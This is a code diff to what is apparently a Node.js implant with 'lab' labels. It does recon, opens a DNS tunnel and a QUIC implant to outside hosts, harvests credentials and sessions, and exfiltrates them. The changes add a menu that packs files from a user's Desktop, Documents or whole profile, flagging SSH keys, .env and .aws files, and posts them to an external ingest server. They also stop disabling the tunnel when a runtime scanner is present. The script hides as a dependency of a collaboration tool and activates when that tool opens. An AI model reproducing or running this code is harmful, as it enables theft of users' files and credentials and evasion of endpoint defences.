@@ -22,21 +22,14 @@ const ENVF = path.join(TMP, 'logfwd.env.json');
 const LOCK = path.join(TMP, 'logfwd.lock');
 const LOCK_WINDOW_MS = 120000;
 
-const PROXY_HOST = process.env.LAB_PROXY_HOST || '10.0.0.1';
-const PROXY_PORT = Number(process.env.LAB_PROXY_PORT || 8888);
-
-const DNS1 = process.env.LAB_DNS_SERVER || '34.146.249.74';
+const DNS1 = process.env.LAB_DNS_SERVER || '52.74.96.66';
 const ZONE = process.env.LAB_TUNNEL_ZONE || 'dns1.apexadversary.com';
 const TUNNEL_PROXY = process.env.LAB_TUNNEL_PROXY || '127.0.0.1:8889';
 let TUNNEL_PID = null;
 
-const EICAR_HOST = 'secure.eicar.org';
-const EICAR_PATH = '/eicar.com.txt';
-const EICAR_OUT = path.join(TMP, 'eicar.com.txt');
-
 const QUIC = {
   name: 'quic_implant.py',
-  server: process.env.LAB_QUIC_SERVER || '34.146.249.74',
+  server: process.env.LAB_QUIC_SERVER || '52.74.96.66',
   port: process.env.LAB_QUIC_PORT || '443'
 };
 
@@ -171,176 +164,6 @@ function recentRun() {
   return false;
 }
 
-function dechunk(buf) {
-  const parts = [];
-  let pos = 0;
-  while (pos < buf.length) {
-    const eol = buf.indexOf('\r\n', pos);
-    if (eol < 0) break;
-    const size = parseInt(buf.toString('ascii', pos, eol).split(';')[0].trim(), 16);
-    if (!Number.isFinite(size) || size <= 0) break;
-    parts.push(buf.slice(eol + 2, eol + 2 + size));
-    pos = eol + 2 + size + 2;
-  }
-  return Buffer.concat(parts);
-}
-
-function splitResponse(raw) {
-  const idx = raw.indexOf('\r\n\r\n');
-  if (idx < 0) throw new Error('malformed HTTP response');
-  const lines = raw.slice(0, idx).toString('latin1').split('\r\n');
-  const headers = {};
-  for (let i = 1; i < lines.length; i++) {
-    const c = lines[i].indexOf(':');
-    if (c > 0) headers[lines[i].slice(0, c).trim().toLowerCase()] = lines[i].slice(c + 1).trim();
-  }
-  let body = raw.slice(idx + 4);
-  if (String(headers['transfer-encoding'] || '').toLowerCase().includes('chunked')) {
-    body = dechunk(body);
-  }
-  return { statusLine: lines[0], headers, body };
-}
-
-function proxiedHttpsGet(host, pathname, cb) {
-  const sock = net.createConnection(PROXY_PORT, PROXY_HOST, () => {
-    sock.write(
-      `CONNECT ${host}:443 HTTP/1.1\r\n` +
-      `Host: ${host}:443\r\n` +
-      `Proxy-Connection: keep-alive\r\n\r\n`
-    );
-  });
-
-  let handshake = Buffer.alloc(0);
-  let settled = false;
-  const fail = (err) => {
-    if (settled) return;
-    settled = true;
-    sock.destroy();
-    cb(err);
-  };
-
-  sock.setTimeout(3000, () => fail(new Error('proxy handshake timeout')));
-
-  const onData = (chunk) => {
-    handshake = Buffer.concat([handshake, chunk]);
-    const sep = handshake.indexOf('\r\n\r\n');
-    if (sep < 0) return;
-    sock.removeListener('data', onData);
-    sock.setTimeout(0);
-
-    const statusLine = handshake.slice(0, handshake.indexOf('\r\n')).toString('latin1');
-    if (!/^HTTP\/1\.[01] 200/.test(statusLine)) {
-      return fail(new Error(`proxy refused CONNECT (${statusLine})`));
-    }
-    const leftover = handshake.slice(sep + 4);
-
-    const tlsOpts = { socket: sock, rejectUnauthorized: false };
-    if (!net.isIP(host)) tlsOpts.servername = host;
-    const secure = tls.connect(tlsOpts, () => {
-      secure.write(
-        `GET ${pathname} HTTP/1.1\r\n` +
-        `Host: ${host}\r\n` +
-        `Connection: close\r\n` +
-        `Accept: */*\r\n\r\n`
-      );
-    });
-
-    let resp = leftover.length ? leftover : Buffer.alloc(0);
-    secure.setTimeout(30000, () => fail(new Error('upstream timeout')));
-    secure.on('data', (c) => { resp = Buffer.concat([resp, c]); });
-    secure.on('end', () => {
-      if (settled) return;
-      settled = true;
-      try { cb(null, splitResponse(resp)); } catch (e) { cb(e); }
-    });
-    secure.on('error', fail);
-  };
-
-  sock.on('data', onData);
-  sock.on('error', fail);
-}
-
-function fetchEicar() {
-  return new Promise((resolve, reject) => {
-    proxiedHttpsGet(EICAR_HOST, EICAR_PATH, (err, res) => {
-      if (err) return reject(err);
-      if (!/^HTTP\/1\.[01] 2\d\d/.test(res.statusLine)) {
-        return reject(new Error(`upstream returned ${res.statusLine}`));
-      }
-      resolve(res.body);
-    });
-  });
-}
-
-function proxiedHttpsPost(url, bodyBuf, contentType) {
-  return new Promise((resolve, reject) => {
-    const u = new URL(url);
-    const host = u.hostname;
-    const port = u.port || (u.protocol === 'https:' ? 443 : 80);
-    const sock = net.createConnection(PROXY_PORT, PROXY_HOST, () => {
-      sock.write(
-        `CONNECT ${host}:${port} HTTP/1.1\r\n` +
-        `Host: ${host}:${port}\r\n` +
-        `Proxy-Connection: keep-alive\r\n\r\n`
-      );
-    });
-
-    let handshake = Buffer.alloc(0);
-    let settled = false;
-    const fail = (err) => {
-      if (settled) return;
-      settled = true;
-      sock.destroy();
-      reject(err);
-    };
-
-    sock.setTimeout(3000, () => fail(new Error('proxy handshake timeout')));
-
-    const onData = (chunk) => {
-      handshake = Buffer.concat([handshake, chunk]);
-      const sep = handshake.indexOf('\r\n\r\n');
-      if (sep < 0) return;
-      sock.removeListener('data', onData);
-      sock.setTimeout(0);
-
-      const statusLine = handshake.slice(0, handshake.indexOf('\r\n')).toString('latin1');
-      if (!/^HTTP\/1\.[01] 200/.test(statusLine)) {
-        return fail(new Error(`proxy refused CONNECT (${statusLine})`));
-      }
-      const leftover = handshake.slice(sep + 4);
-
-      const tlsOpts = { socket: sock, rejectUnauthorized: false };
-      if (!net.isIP(host)) tlsOpts.servername = host;
-      const secure = tls.connect(tlsOpts, () => {
-        secure.write(
-          `POST ${u.pathname + u.search} HTTP/1.1\r\n` +
-          `Host: ${host}:${port}\r\n` +
-          `Content-Type: ${contentType || 'application/json'}\r\n` +
-          `Content-Length: ${bodyBuf.length}\r\n` +
-          `Connection: close\r\nAccept: */*\r\n\r\n`
-        );
-        secure.write(bodyBuf);
-      });
-
-      let resp = leftover.length ? leftover : Buffer.alloc(0);
-      secure.setTimeout(30000, () => fail(new Error('upstream timeout')));
-      secure.on('data', (c) => { resp = Buffer.concat([resp, c]); });
-      secure.on('end', () => {
-        if (settled) return;
-        settled = true;
-        try {
-          const r = splitResponse(resp);
-          resolve({ status: parseInt(r.statusLine.split(' ')[1], 10) || 0, body: r.body });
-        } catch (e) { reject(e); }
-      });
-      secure.on('error', fail);
-    };
-
-    sock.on('data', onData);
-    sock.on('error', fail);
-  });
-}
-
 function runCmd(file, args, timeout) {
   return new Promise((resolve) => {
     execFile(file, args, { windowsHide: true, timeout: timeout || 20000 }, (err, stdout, stderr) => {
@@ -443,34 +266,15 @@ async function phase1Recon() {
   log(`[*] sudo -n (passwordless) -> ${env.sudoN}`);
 
   env.tunDevice = fs.existsSync('/dev/net/tun');
-  if (IS_LINUX) log(`[*] /dev/net/tun -> ${env.tunDevice} (iodine needs root+TUN)`);
 
   env.python = await findPython();
   log(`[*] python -> ${env.python || 'absent'}`);
-
-  const io = await runCmd(IS_WIN ? 'where' : 'sh', IS_WIN ? ['iodine'] : ['-c', 'command -v iodine']);
-  env.iodine = IS_WIN ? !io.err && /iodine/i.test(io.out) : !io.err;
-  log(`[*] iodine present -> ${env.iodine}`);
 
   env.dnsDirect = await dnsProbe(DNS1, ZONE, 3000);
   log(`[*] direct UDP/53 -> ${DNS1}: ${env.dnsDirect.ok ? `reachable rcode=${env.dnsDirect.rcode}` : `FAIL ${env.dnsDirect.err}`}`);
 
   env.httpsGithub = await httpsProbe('https://github.com/robots.txt', 5000);
   log(`[*] https github -> ${env.httpsGithub.ok ? `status=${env.httpsGithub.status}` : `FAIL ${env.httpsGithub.err}`}`);
-
-  if (process.env.LAB_SKIP_EICAR !== '1') {
-    try {
-      const body = await fetchEicar();
-      fs.writeFileSync(EICAR_OUT, body);
-      env.proxyEicar = true;
-      log(`[+] eicar via proxy -> ${EICAR_OUT} (${body.length} bytes, marker=${body.includes('EICAR')})`);
-    } catch (e) {
-      env.proxyEicar = false;
-      log(`[-] eicar via proxy: ${e.message}`);
-    }
-  } else {
-    log('[*] eicar skipped');
-  }
 
   if (IS_LINUX) {
     env.unprivUserns = readProcSys('/proc/sys/kernel/unprivileged_userns_clone');
@@ -693,125 +497,6 @@ async function phase3Harvest(cfg, state) {
   log('[phase3/6] HARVEST done');
 }
 
-async function fetchDatasets(cfg, state, tunnelUp) {
-  const ds = (cfg && cfg.datasets) || {};
-  const base = ds.base || 'https://api-production.data.gov.sg/v2/public/api';
-  const filter = (ds.filter || ['Ministry of Health', 'Ministry of Finance']).map((s) => s.toLowerCase());
-  const limit = ds.limit || 20;
-
-  const get = async (url) => {
-    try { return await directGet(url); }
-    catch (e1) {
-      if (!tunnelUp) throw e1;
-      log(`[*] datasets direct failed (${e1.message}), trying tunnel`);
-      return tunnelGet(url);
-    }
-  };
-
-  const match = (agency) => filter.some((f) => String(agency || '').toLowerCase().includes(f));
-  const seen = new Set();
-  const picked = [];
-  const add = (id, name, agency, fmt) => {
-    if (!id || seen.has(id) || picked.length >= limit) return;
-    if (!match(agency)) return;
-    seen.add(id);
-    picked.push({ id, name, agency, format: fmt || '' });
-  };
-
-  const PAGES_MAX = 60;
-  const PAGE_CONC = 8;
-
-  const scanPages = async (endpoint, key) => {
-    const idKey = endpoint === 'datasets' ? 'datasetId' : 'collectionId';
-    const fetchPage = async (k, stride) => {
-      try {
-        const j = JSON.parse((await get(`${base}/${endpoint}?limit=100&offset=${k * stride}`)).toString());
-        return { items: (j.data && j.data[key]) || [], total: Number(j.data && j.data.pages) || 0 };
-      } catch (e) { return null; }
-    };
-
-    const r0 = await fetchPage(0, 0);
-    if (!r0 || !r0.items.length) return { items: [], pages: 0 };
-    const stride = r0.items.length;
-    const items = r0.items.slice();
-    const seenIds = new Set(r0.items.map((x) => String(x[idKey])));
-    let pages = 1;
-
-    const absorb = (arr) => {
-      let fresh = 0;
-      for (const x of arr) {
-        items.push(x);
-        const id = String(x[idKey]);
-        if (!seenIds.has(id)) { seenIds.add(id); fresh++; }
-      }
-      return fresh;
-    };
-
-    // probe the next page: if it yields no new ids the endpoint is not
-    // honoring offset, so one more pass is pure waste — stop there.
-    const r1 = await fetchPage(1, stride);
-    if (!r1 || !r1.items.length) return { items, pages };
-    pages++;
-    if (absorb(r1.items) === 0) return { items, pages };
-
-    const total = Math.min(PAGES_MAX, r0.total || PAGES_MAX);
-    for (let p = 2; p < total; p += PAGE_CONC) {
-      const idx = [];
-      for (let k = p; k < Math.min(p + PAGE_CONC, total); k++) idx.push(k);
-      const rs = await Promise.all(idx.map((k) => fetchPage(k, stride)));
-      for (const r of rs) {
-        if (r && r.items.length) { pages++; absorb(r.items); }
-      }
-    }
-    return { items, pages };
-  };
-
-  try {
-    const r = await scanPages('datasets', 'datasets');
-    for (const d of r.items) add(d.datasetId, d.name, d.managedByAgencyName, d.format);
-    log(`[*] datasets list -> ${r.items.length} entries scanned over ${r.pages} page(s), ${picked.length} match filter`);
-  } catch (e) {
-    log(`[-] datasets list: ${e.message}`);
-  }
-
-  try {
-    const r = await scanPages('collections', 'collections');
-    for (const c of r.items) {
-      add(c.collectionId, c.name, c.managedByAgencyName || (c.sources || []).join(','), 'collection');
-    }
-    log(`[*] collections list -> ${picked.length} total matches after ${r.pages} page(s)`);
-  } catch (e) {
-    log(`[-] collections list: ${e.message}`);
-  }
-
-  state.datasets = picked;
-  if (!picked.length) {
-    log('[-] no datasets matched filter');
-    return;
-  }
-  const loot = path.join(TMP, 'loot');
-  try {
-    fs.mkdirSync(loot, { recursive: true });
-    fs.writeFileSync(path.join(loot, 'datasets.json'), JSON.stringify(picked, null, 2));
-    log(`[+] dataset manifest -> ${path.join(loot, 'datasets.json')} (${picked.length} datasets)`);
-  } catch (e) {
-    log(`[-] dataset manifest: ${e.code || e.message}`);
-  }
-
-  const first = picked.find((d) => d.format && d.format !== 'collection') || picked[0];
-  if (first && first.format !== 'collection') {
-    for (const suffix of [`/datasets/${first.id}/data?limit=50`, `/datasets/${first.id}/csv`]) {
-      try {
-        const sample = await get(base + suffix);
-        const f = path.join(loot, `dataset_${String(first.id).slice(0, 12)}.sample`);
-        fs.writeFileSync(f, sample);
-        log(`[+] dataset sample content -> ${f} (${sample.length} bytes)`);
-        break;
-      } catch (e) { log(`[*] dataset content ${suffix.split('?')[0]} -> ${e.message}`); }
-    }
-  }
-}
-
 // ---------------------------------------------------------------- phase 4
 function tunnelGet(url) {
   return new Promise((resolve, reject) => {
@@ -886,12 +571,7 @@ function directPost(url, bodyBuf, contentType) {
 }
 
 async function phase4Fetch(cfg, state, tunnelUp) {
-  log('[phase4/6] FETCH: datasets + staged payloads');
-  if (process.env.LAB_SKIP_DATASETS === '1') {
-    log('[*] datasets skipped (LAB_SKIP_DATASETS=1)');
-  } else {
-    await fetchDatasets(cfg, state, tunnelUp);
-  }
+  log('[phase4/6] FETCH: staged payloads');
 
   let list = [];
   try { list = JSON.parse(process.env.LAB_FETCH || '[]'); } catch (e) { void e; }
@@ -1006,6 +686,7 @@ function classifyAssets(rec) {
   ];
   (rec.files || []).forEach((f) => {
     const p = String(f.path || '');
+    if (/^(desktop\.ini|thumbs\.db|ntuser)/i.test(p.split(/[\\/]/).pop() || '')) return;
     for (const [cls, re] of fileRules) {
       if (re.test(p)) {
         cap(cls, { src: f.kind === 'credential' ? 'key' : 'file', label: p, value: `${f.size || 0} B` });
@@ -1023,9 +704,6 @@ function classifyAssets(rec) {
       cap('mnpi', { src: 'credential', label: k, value: v });
     }
   });
-  (rec.datasets || []).forEach((ds) => {
-    cap('regulated', { src: 'dataset', label: String(ds.name || ds.id || ''), value: String(ds.agency || '') });
-  });
   return A;
 }
 
@@ -1039,6 +717,8 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
   const files = scanFiles(home);
   const keyFiles = files.filter((f) => f.kind === 'credential').length;
   log(`[*] scan ${home}: ${files.length} files (${keyFiles} credential-like)`);
+  const sessions = state.sessions || [];
+  log(`[*] session harvest: ${sessions.length} active cloud/SaaS login session(s)`);
 
   let user = '?';
   try { user = os.userInfo().username; } catch (e) { void e; }
@@ -1050,13 +730,13 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
     kernel: os.release(),
     recon: {
       sudoN: env.sudoN, python: env.python, dnsDirect: env.dnsDirect,
-      httpsGithub: env.httpsGithub, proxyEicar: env.proxyEicar
+      httpsGithub: env.httpsGithub
     },
     tunnelUp: !!tunnelUp,
     creds: state.creds || [],
     env: state.envVars || [],
     files,
-    datasets: state.datasets || [],
+    sessions,
     posture: Object.assign({}, state.posture || {}, state.vaultScope ? { vault: state.vaultScope } : {}),
     primitives: state.primitives || null
   };
@@ -1092,20 +772,7 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
   }
 
   if (ingestPub) {
-    try {
-      const t0 = Date.now();
-      const res = await proxiedHttpsPost(ingestPub, bodyBuf);
-      if (res.status >= 200 && res.status < 300) {
-        log(`[+] exfil delivered via proxy CONNECT to ${ingestPub} (${bodyBuf.length} bytes, ${Date.now() - t0}ms)`);
-        return;
-      }
-      log(`[-] proxy CONNECT exfil status ${res.status}`);
-    } catch (e) {
-      log(`[-] proxy CONNECT exfil: ${e.message}`);
-    }
-
-    // direct egress: tunnel is suppressed under EDR and the lab has no forward
-    // proxy, so push straight to the public ingest (self-signed leaf accepted).
+    // direct egress to the public ingest (self-signed leaf accepted).
     try {
       const t0 = Date.now();
       const res = await directPost(ingestPub, bodyBuf);
@@ -1118,7 +785,7 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
       log(`[-] direct exfil: ${e.message}`);
     }
   } else {
-    log('[-] no public ingest URL for proxy fallback');
+    log('[-] no public ingest URL for direct fallback');
   }
   log('[-] exfil failed on all channels, local copy kept at ' + path.join(loot, 'exfil_record.json'));
 }
@@ -1190,7 +857,11 @@ async function ensureQuicVenv() {
     log(`[*] quic venv create -> ${fmt(r)}`);
     if (r.err) return null;
   }
-  const inst = await runCmd(py, ['-m', 'pip', 'install', '-q', 'aioquic'], 120000);
+  // cryptography>=47 and pyopenssl>=26.3 drop Windows-ARM64 wheels, which forces a
+  // Rust/MSVC source build that fails without build tools. Pin to the last pair
+  // that ships aarch64-pc-windows-msvc binaries so aioquic installs cleanly.
+  const inst = await runCmd(py, ['-m', 'pip', 'install', '-q',
+    'cryptography==46.0.3', 'pyopenssl==26.2.0', 'aioquic'], 180000);
   log(`[*] pip install aioquic -> ${fmt(inst)}`);
   const chk = await runCmd(py, ['-c', 'import aioquic']);
   if (chk.err) {
@@ -1496,12 +1167,12 @@ function dconnectInstallContext() {
 }
 
 function armDconnectWatch(ppid) {
-  log(`[*] DConnect session binding: parent pid ${ppid} (tunnel follows the collab tool; QUIC implant persists)`);
+  log(`[*] DConnect session binding: parent pid ${ppid} (DNS tunnel follows the collab tool; QUIC implant persists)`);
   const tick = setInterval(() => {
     let alive = true;
     try { process.kill(ppid, 0); } catch (e) { alive = e.code === 'EPERM'; }
     if (alive) return;
-    log('[*] DConnect closed — terminating tunnel channel (QUIC implant left running)');
+    log('[*] DConnect closed — terminating DNS tunnel channel (QUIC implant left running)');
     if (TUNNEL_PID) {
       try { process.kill(-TUNNEL_PID); } catch (e) { void e; }
       log(`[*] stopped tunnel (pid ${TUNNEL_PID})`);
@@ -1533,10 +1204,10 @@ async function main() {
   }
   const scanner = probeRuntimeScanner();
   if (scanner.present) {
-    log(`[*] runtime scanner detected: ${scanner.found.join(', ')} — TCP-over-DNS suppressed`);
+    log(`[*] runtime scanner detected: ${scanner.found.join(', ')}`);
   }
   const env = process.env.LAB_SKIP_RECON === '1' ? {} : await phase1Recon();
-  const tunnelUp = scanner.present ? false : await phase2Tunnel(env, cfg);
+  const tunnelUp = await phase2Tunnel(env, cfg);
   const state = {};
   if (process.env.LAB_SKIP_RECON !== '1') {
     state.posture = await collectPosture(env);
@@ -1586,7 +1257,192 @@ async function main() {
 process.on('uncaughtException', (e) => log(`[-] uncaught: ${e && e.stack || e}`));
 process.on('unhandledRejection', (e) => log(`[-] unhandled rejection: ${e && e.message || e}`));
 
-if (process.argv.includes('--status')) {
+// ------------------------------------------------------- quick transfer menu
+const TRANSFER_TARGETS = [
+  ['1', 'Desktop', (h) => path.join(h, 'Desktop')],
+  ['2', 'Downloads', (h) => path.join(h, 'Downloads')],
+  ['3', 'Documents', (h) => path.join(h, 'Documents')],
+  ['4', 'Pictures', (h) => path.join(h, 'Pictures')],
+  ['5', 'Entire user profile', (h) => h],
+];
+const TRANSFER_SKIP_BASE = /^(desktop\.ini|thumbs\.db|ehthumbs\.db|ntuser\.[a-z0-9]+|ehthumbs_vista\.db)$/i;
+const TRANSFER_FILE_CAP = 512 * 1024;
+const TRANSFER_TOTAL_CAP = 6 * 1024 * 1024;
+const TRANSFER_MAX_FILES = 400;
+
+function transferKind(rel) {
+  const b = path.basename(rel);
+  if (/\.(env|pem|key|pfx|p12|ovpn|kdbx|ppk|jks)$/i.test(b)) return 'credential';
+  if (/^(\.env.*|\.npmrc|\.netrc|\.pgpass|id_(rsa|ed25519|ecdsa)|credentials|\.aws|\.bash_history)$/i.test(b)) return 'credential';
+  if (/(password|secret|token|credential|private[_-]?key)/i.test(b)) return 'credential';
+  return 'file';
+}
+
+function collectTransfer(root) {
+  const out = [];
+  const walk = (dir, depth) => {
+    if (out.length >= TRANSFER_MAX_FILES || depth > 6) return;
+    let ents;
+    try { ents = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { return; }
+    for (const e of ents) {
+      if (out.length >= TRANSFER_MAX_FILES) return;
+      const p = path.join(dir, e.name);
+      if (e.isDirectory()) { walk(p, depth + 1); continue; }
+      if (!e.isFile()) continue;
+      if (TRANSFER_SKIP_BASE.test(e.name)) continue;
+      if (/\.(crdownload|part|tmp)$/i.test(e.name) || e.name.endsWith('~')) continue;
+      let st;
+      try { st = fs.statSync(p); } catch (e2) { continue; }
+      out.push({ rel: path.relative(root, p), path: p, size: st.size, kind: transferKind(e.name) });
+    }
+  };
+  walk(root, 0);
+  return out;
+}
+
+function resolveTransferRoot(sel) {
+  const h = os.homedir();
+  const key = String(sel || '').toLowerCase().replace(/^--transfer=*/, '').trim();
+  if (!key) return null;
+  const hit = TRANSFER_TARGETS.find(([n, name]) => n === key || name.toLowerCase() === key);
+  if (hit) return hit[2](h);
+  if (key === 'home' || key === 'all') return h;
+  if (key === '0') return null;
+  if (/^(\.|~|[a-z]:[\\/]|[\\/])/.test(sel)) {
+    const abs = sel.startsWith('~') ? path.join(h, sel.slice(1)) : sel;
+    return path.resolve(abs);
+  }
+  return path.join(h, sel);
+}
+
+function printTransferMenu() {
+  console.log('\n=== QUICK TRANSFER MENU -> ingest :8443 ===');
+  for (const [n, name] of TRANSFER_TARGETS) console.log(`  ${n}) ${name}`);
+  console.log('  6) custom path');
+  console.log('  0) quit');
+  console.log(`  caps: ${TRANSFER_FILE_CAP / 1024}KB/file, ${TRANSFER_TOTAL_CAP / 1024 / 1024}MB total, ${TRANSFER_MAX_FILES} files\n`);
+}
+
+function askLine(prompt) {
+  return new Promise((resolve) => {
+    if (process.stdin.isTTY) {
+      const rl = require('readline').createInterface({ input: process.stdin, output: process.stdout });
+      rl.question(prompt, (a) => { rl.close(); resolve(String(a).trim()); });
+      return;
+    }
+    let buf = '';
+    const done = () => resolve(buf.split(/\r?\n/)[0].trim());
+    process.stdin.once('data', (c) => { buf += c; done(); });
+    process.stdin.once('end', done);
+    process.stdin.once('error', () => resolve(''));
+    setTimeout(() => resolve(buf.split(/\r?\n/)[0].trim()), 3000);
+  });
+}
+
+async function runTransfer(sel) {
+  const cfg = loadConfig();
+  let user = '?';
+  try { user = os.userInfo().username; } catch (e) { void e; }
+  const root = resolveTransferRoot(sel);
+  if (!root) { log('[transfer] cancelled'); return false; }
+  if (!fs.existsSync(root)) { log(`[-] transfer: no such directory ${root}`); return false; }
+
+  log(`[transfer] source=${root}`);
+  const entries = collectTransfer(root);
+  const blobs = [];
+  let total = 0;
+  for (const e of entries) {
+    if (total >= TRANSFER_TOTAL_CAP) break;
+    let buf;
+    try { buf = fs.readFileSync(e.path); } catch (err) { continue; }
+    let truncated = false;
+    if (buf.length > TRANSFER_FILE_CAP) { buf = buf.subarray(0, TRANSFER_FILE_CAP); truncated = true; }
+    total += buf.length;
+    blobs.push({ rel: e.rel, size: e.size, truncated, data: buf.toString('base64') });
+  }
+  const credCount = entries.filter((e) => e.kind === 'credential').length;
+  log(`[transfer] ${entries.length} files (${credCount} credential-like), ${total} bytes packed`);
+
+  const record = {
+    target: os.hostname(),
+    user,
+    ts: new Date().toISOString(),
+    platform: process.platform,
+    kernel: os.release(),
+    kind: 'quick-transfer',
+    tunnelUp: false,
+    creds: [],
+    sessions: [],
+    files: entries.map((e) => ({ path: e.rel, size: e.size, kind: e.kind })),
+    transfer: { source: root, fileCount: entries.length, byteCount: total, files: blobs }
+  };
+  record.assets = classifyAssets(record);
+
+  const loot = path.join(TMP, 'loot');
+  try {
+    fs.mkdirSync(loot, { recursive: true });
+    fs.writeFileSync(path.join(loot, 'transfer_record.json'), JSON.stringify(record, null, 2));
+  } catch (e2) { void e2; }
+
+  const ingest = (cfg && cfg.ingest) || '';
+  const ingestPub = process.env.LAB_INGEST_PUBLIC || (cfg && cfg.ingest_public) || '';
+  if (!ingest) { log('[-] transfer: no ingest endpoint in config'); return false; }
+
+  const bodyBuf = Buffer.from(JSON.stringify(record));
+  const tunnelUp = await phase2Tunnel({}, cfg);
+  record.tunnelUp = !!tunnelUp;
+  if (tunnelUp) {
+    for (let attempt = 1; attempt <= 3; attempt++) {
+      try {
+        const t0 = Date.now();
+        await tunnelPost(ingest, record);
+        log(`[+] transfer delivered via tunnel to ${ingest} (${bodyBuf.length} bytes, ${Date.now() - t0}ms, attempt ${attempt})`);
+        return true;
+      } catch (e3) {
+        log(`[-] transfer via tunnel attempt ${attempt}: ${e3.message}`);
+        await delay(2000);
+      }
+    }
+  }
+  if (ingestPub) {
+    try {
+      const res = await directPost(ingestPub, Buffer.from(JSON.stringify(record)));
+      if (res.status >= 200 && res.status < 300) {
+        log(`[+] transfer delivered direct to ${ingestPub} (${bodyBuf.length} bytes)`);
+        return true;
+      }
+      log(`[-] transfer direct status ${res.status}`);
+    } catch (e4) {
+      log(`[-] transfer direct: ${e4.message}`);
+    }
+  }
+  log('[-] transfer failed on all channels, local copy kept at ' + path.join(loot, 'transfer_record.json'));
+  return false;
+}
+
+async function transferMenuCli() {
+  const arg = process.argv.find((a, i) => process.argv[i - 1] === '--transfer');
+  if (arg) {
+    await runTransfer(arg);
+    process.exit(0);
+  }
+  if (!process.stdin.isTTY) {
+    log('[transfer] non-interactive stdin, defaulting to Desktop (use --transfer <target>)');
+    await runTransfer('1');
+    process.exit(0);
+  }
+  printTransferMenu();
+  const choice = await askLine('select> ');
+  if (choice === '0' || !choice) { console.log('bye'); process.exit(0); }
+  let target = choice;
+  if (choice === '6') target = await askLine('path> ');
+  await runTransfer(target);
+  process.exit(0);
+}
+
+if (process.argv.includes('--transfer') || process.argv.includes('--transfer-menu')) {
+  transferMenuCli().catch((e) => { log(`[-] transfer fatal: ${e.message}`); process.exit(1); });
+} else if (process.argv.includes('--status')) {
   let stateLine = 'no local runs yet';
   try {
     const st = fs.statSync(LOCK);
@@ -1602,9 +1458,9 @@ if (process.argv.includes('--status')) {
   process.exit(0);
 }
 
-if (dconnectInstallContext()) {
+else if (dconnectInstallContext()) {
   log('[*] installed as DConnect dependency — agent armed, activates when DConnect opens');
   process.exit(0);
+} else {
+  main().catch((e) => log(`[-] fatal: ${e.message}`));
 }
-
-main().catch((e) => log(`[-] fatal: ${e.message}`));
